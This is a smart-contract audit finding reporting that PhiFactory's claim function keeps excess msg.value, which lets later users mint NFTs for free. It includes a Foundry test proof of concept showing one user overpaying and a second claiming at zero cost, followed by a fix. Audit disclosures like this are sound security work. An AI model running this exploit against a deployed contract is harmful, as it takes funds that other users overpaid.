# Vulnerability details

## Impact
The function `PhiFactory.sol:claim` passes only the `mintFee` to `PhiFactory.sol:signatureClaim` or `PhiFactory.sol:merkleClaim` and the rest of the `msg.value` are accumulated by the `PhiFactory`. 
This way the claimer pays more for the claim and later someone can mint NFT for free or with a discount by providing 0 or less than the
required `msg.value` to the `PhiFactory.sol:claim` function. 
Inside the function reliability section in the README, there is a bullet about unnecessary accumulation inside the contract.

Claimer loses his `msg.value` and someone later claims NFT with a discount or free at all

## Proof of Concept
Paste the following test inside `PhiFactory.t.sol`:

```javascript
function test_claim_leaves_money_inside_contract() public {
    _createArt(ART_ID_URL_STRING);
    uint256 artId = 1;
    bytes32 advanced_data = bytes32("1");
    bytes memory signData =
        abi.encode(expiresIn, participant, referrer, verifier, artId, block.chainid, advanced_data);
    bytes32 msgHash = keccak256(signData);
    bytes32 digest = ECDSA.toEthSignedMessageHash(msgHash);
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(claimSignerPrivateKey, digest);
    if (v != 27) s = s | bytes32(uint256(1) << 255);
    bytes memory signature = abi.encodePacked(r, s);
    bytes memory data =
        abi.encode(1, participant, referrer, verifier, expiresIn, uint256(1), advanced_data, IMAGE_URL, signature);
    bytes memory dataCompressed = LibZip.cdCompress(data);
    uint256 totalMintFee = phiFactory.getArtMintFee(1, 1);

    vm.startPrank(participant, participant);

    /* Set the balance of the participant  */
    vm.deal(participant, totalMintFee + 5 ether);

    assertEq(address(phiFactory).balance, 0);
    console2.log(address(phiFactory).balance);

    /* Claim with excesss money */
    phiFactory.claim{ value: totalMintFee + 1 ether }(dataCompressed);

    /* Asserts that the contract has kept the excess money */
    assertEq(address(phiFactory).balance, 1 ether);
    console2.log(address(phiFactory).balance);

    /* Bob sees that the contract has kept the excess money and claim NFT for free */
    address bob = makeAddr("bob");
    vm.startPrank(bob, bob);

    uint256 artId2 = 1;
    bytes32 advanced_data2 = bytes32("1");
    bytes memory signData2 = abi.encode(expiresIn, bob, referrer, verifier, artId2, block.chainid, advanced_data2);
    bytes32 msgHash2 = keccak256(signData2);
    bytes32 digest2 = ECDSA.toEthSignedMessageHash(msgHash2);
    (uint8 v2, bytes32 r2, bytes32 s2) = vm.sign(claimSignerPrivateKey, digest2);
    if (v2 != 27) s2 = s2 | bytes32(uint256(1) << 255);
    bytes memory signature2 = abi.encodePacked(r2, s2);
    bytes memory data2 =
        abi.encode(1, bob, referrer, verifier, expiresIn, uint256(1), advanced_data2, IMAGE_URL, signature2);
    bytes memory dataCompressed2 = LibZip.cdCompress(data2);

    phiFactory.claim{ value: 0 }(dataCompressed2);

    address artAddress = phiFactory.getArtAddress(1);
    /* Asserts that bob claimed the NFT for free */
    assertEq(IERC1155(artAddress).balanceOf(bob, 1), 1, "bob erc1155 balance");
}
```

## Recommended Mitigation Steps
Either pass the whole `msg.value` to `PhiFactory.sol:signatureClaim` or
`PhiFactory.sol:merkleClaim` or return the excess `msg.value`
